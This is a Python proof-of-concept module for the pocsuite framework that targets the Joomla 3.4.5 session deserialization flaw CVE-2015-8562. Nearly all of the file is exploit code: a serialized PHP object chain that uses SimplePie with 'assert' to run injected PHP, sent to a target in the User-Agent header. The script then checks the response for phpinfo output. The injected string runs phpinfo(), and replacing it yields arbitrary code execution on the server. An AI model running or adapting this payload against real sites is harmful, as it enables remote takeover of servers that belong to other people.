#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class TestPOC(POCBase):
    vulID = '00003'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-08-26'
    createDate = '2017-08-26'
    updateDate = '2017-08-26'
    references = ['http://cxsecurity.com/cveshow/CVE-2015-8562/']
    name = 'Joomla 反序列化漏洞 PoC'
    appPowerLink = 'https://www.joomla.org'
    appName = 'Joomla'
    appVersion = '3.4.5'
    vulType = 'RCE'
    desc = '''
    	漏洞存在于反序列化session的过程中
    '''
    samples = ['']
    
    def _verify(self):
        result = {}
        payload = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
        headers = {'User-Agent': payload}
        response = req.get(self.url, headers=headers, timeout=1)
        #response2 = req.get(self.url)
        if 'SERVER["REMOTE_ADDR"]' in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = payload
        return self.parse_attack(result)
    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output
register(TestPOC)